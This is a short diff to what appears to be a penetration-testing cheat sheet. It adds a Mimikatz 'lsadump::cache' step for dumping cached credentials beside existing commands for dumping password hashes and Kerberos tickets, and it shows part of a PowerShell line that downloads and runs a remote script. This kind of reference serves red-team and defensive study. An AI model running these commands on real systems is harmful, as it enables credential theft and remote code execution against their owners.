@@ -155,6 +155,9 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuse
 password hash:
 1. privilege::debug
 2. sekurlsa::logonpasswords
+Cached Credentials:
+1. privilege::debug
+2. lsadump::cache
 TGT and TGS:
 1. sekurlsa::tickets
 ```
